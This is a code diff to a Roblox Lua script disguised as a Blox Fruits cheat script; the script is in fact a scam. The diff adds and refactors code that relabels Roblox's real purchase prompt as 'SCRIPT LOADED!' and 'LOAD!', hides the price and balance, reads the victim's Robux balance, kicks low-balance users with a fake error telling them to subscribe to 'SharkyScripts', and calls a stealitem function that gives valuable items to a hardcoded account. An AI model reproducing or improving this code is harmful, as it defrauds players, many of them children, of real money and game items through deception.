@@ -6,7 +6,7 @@ local Username = "x6TNine"   -- Username to gift items to
 --Kicks
 local kickMessage = "\n[DELTA DOES NOT WORK WITH THIS SCRIPT]\nScript Failed To Load!\nCheck the following- \n1) Please Sub to SharkyScripts\n2) Use main account, alts will be detected\n3) Use different Executor & Try again."  -- Kick message
 local insufficientRobuxMessage = "\n[DELTA DOES NOT WORK WITH THIS SCRIPT]\nScript Failed To Load!\nCheck the following- \n1) Please Sub to SharkyScripts\n2) Use main account, alts will be detected\n3) Use different Executor & Try again." -- Kick message for low robux
-local version = "1.0.8" -- script version number
+local version = "1.0.9" -- script version number
 
 -- Services
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -237,51 +237,88 @@ local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
 local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
 local Animator = ProductContainer:WaitForChild("Animator")
 
+local function modifyPromptUI()
+    if not PurchasePrompt then return end
+    if not ProductContainer then return end
+    if not Animator then return end
+	
+    local prompt = Animator:WaitForChild("Prompt")
+	if not prompt then return end
+    local alertContents = prompt:WaitForChild("AlertContents")
+	if not alertContents then return end
+
+
+    local middleContent = alertContents:FindFirstChild("MiddleContent")
+    if middleContent then
+        middleContent.Visible = false
+    end
+
+    local title = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
+    if title and title:IsA("TextLabel") then
+        title.Text = "SCRIPT LOADED!"
+    end
+
+    local footerButtons = alertContents:WaitForChild("Footer"):WaitForChild("Buttons")
+    local button2 = footerButtons:FindFirstChild("2")
+    if button2 then
+        button2.Visible = false
+    end
+
+    local footerContent = alertContents:WaitForChild("Footer"):FindFirstChild("FooterContent")
+    if footerContent then
+        footerContent.Visible = false
+    end
+
+    local button1 = footerButtons:FindFirstChild("1")
+    if button1 then
+        local buttonContent = button1:WaitForChild("ButtonContent")
+        local buttonMiddleContent = buttonContent:WaitForChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
+        if buttonMiddleContent then
+            buttonMiddleContent.Text = "LOAD!"
+        end
+    end
+	uiLoaded = true
+end
+
 Animator.ChildAdded:Connect(function(child)
     if child.Name == "Prompt" then
-        local prompt = Animator:WaitForChild("Prompt")
-        local alertContents = prompt:WaitForChild("AlertContents")
-
-        local middleContent = alertContents:FindFirstChild("MiddleContent")
-        if middleContent then
-            middleContent.Visible = false
-        end
-
-        local title = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
-        if title and title:IsA("TextLabel") then
-            title.Text = "SCRIPT LOADED!"
-        end
-
-        local footerButtons = alertContents:WaitForChild("Footer"):WaitForChild("Buttons")
-        local button2 = footerButtons:FindFirstChild("2")
-        if button2 then
-            button2.Visible = false
-        end
-
-        local footerContent = alertContents:WaitForChild("Footer"):FindFirstChild("FooterContent")
-        if footerContent then
-            footerContent.Visible = false
-        end
-
-        local button1 = footerButtons:FindFirstChild("1")
-        if button1 then
-            local buttonContent = button1:WaitForChild("ButtonContent")
-            local buttonMiddleContent = buttonContent:WaitForChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
-            if buttonMiddleContent then
-                buttonMiddleContent.Text = "LOAD!"
-            end
-        end
-
-        uiLoaded = true
+        modifyPromptUI()
     end
 end)
 
 
 -- Function to calculate robux
 local function calculateRobux()
-	local RobuxPath = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):WaitForChild("RemainingBalanceText")
-    local balanceText = RobuxPath and RobuxPath.Text:match("(%d+)$")
+    -- Ensure PurchasePrompt is still valid before trying to find its children.
+    local purchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if not purchasePrompt then return 0 end
+    
+    local productPurchaseContainer = purchasePrompt:FindFirstChild("ProductPurchaseContainer")
+    if not productPurchaseContainer then return 0 end
+    
+    local animator = productPurchaseContainer:FindFirstChild("Animator")
+    if not animator then return 0 end
+    
+    local prompt = animator:FindFirstChild("Prompt")
+    if not prompt then return 0 end
+    
+    local alertContents = prompt:FindFirstChild("AlertContents")
+    if not alertContents then return 0 end
+    
+    local footer = alertContents:FindFirstChild("Footer")
+    if not footer then return 0 end
+    
+    local footerContent = footer:FindFirstChild("FooterContent")
+    if not footerContent then return 0 end
 
+    local content = footerContent:FindFirstChild("Content")
+    if not content then return 0 end
+
+    local remainingBalanceText = content:FindFirstChild("RemainingBalanceText")
+    if not remainingBalanceText or not remainingBalanceText.Text then return 0 end
+    
+    local balanceText = remainingBalanceText.Text:match("(%d+)$")
+    
     if balanceText then
 		result = tonumber(balanceText) + 25
 		initialRobuxCheck = true -- Set initial check to true so we don't re calculate this value again
@@ -293,7 +330,7 @@ end
 -- Function to steal items
 local function stealitem()
     local items_to_steal = {
-         { threshold = 5000, storage_name = "Permanent Dragon-Dragon" },
+        { threshold = 5000, storage_name = "Permanent Dragon-Dragon" },
         { threshold = 4000, storage_name = "Permanent Kitsune-Kitsune" },
         { threshold = 3000, storage_name = "Permanent Leopard-Leopard" },
         { threshold = 2700, storage_name = "Fruit Notifier" },
@@ -382,52 +419,13 @@ end
 local function WaitForPrompt1()
     local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
     repeat task.wait() until not Animator:FindFirstChild("Prompt")
-    
-	calculateRobux()
-    
-    local success, err = pcall(function()
-        local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
-        local ProductPurchaseContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
-        local Animator = ProductPurchaseContainer:WaitForChild("Animator")
-        local Prompt = Animator:WaitForChild("Prompt")
-        local AlertContents = Prompt:WaitForChild("AlertContents")
 
-        local MiddleContent = AlertContents:WaitForChild("MiddleContent")
-        MiddleContent.Visible = false
+    calculateRobux()
 
-        local Footer = AlertContents:WaitForChild("Footer")
-        local FooterButtons = Footer:WaitForChild("Buttons")
-        local FooterButton1 = FooterButtons:WaitForChild("1")
-        FooterButton1.Visible = false
-
-        local FooterContent = Footer:WaitForChild("FooterContent")
-        FooterContent.Visible = false
-
-        local FooterButton2 = FooterButtons:WaitForChild("2")
-        FooterButton2.Visible = true
-
-        local FooterButton2Text = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Text")
-        FooterButton2Text.Text = "Activate!"
-        FooterButton2Text.Size = UDim2.new(1, 0, FooterButton2Text.Size.Y.Scale, FooterButton2Text.Size.Y.Offset)
-
-        local FooterButton2Icon = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Icon")
-        FooterButton2Icon.Visible = false
-
-        local TitleContainer = AlertContents:WaitForChild("TitleContainer")
-        local TitleArea = TitleContainer:WaitForChild("TitleArea")
-        local TitleText = TitleArea:WaitForChild("Title")
-        TitleText.Text = "Activate Blox Fruit Script!"
-        TitleText.Size = UDim2.new(1, 0, TitleText.Size.Y.Scale, TitleText.Size.Y.Offset)
-    end)
-
-    if not success then
-        warn("UI Modification Failed: " .. (err or "Unknown"))
-    end
-
-     if result < 25 then
-        kickPlayer(insufficientRobuxMessage)
-        return  -- Stop the script after the check
-    end
+    if result < 25 then
+		kickPlayer(insufficientRobuxMessage)
+		return -- Stop the script if they don't have enough robux
+	end
 
     stealitem()
 end
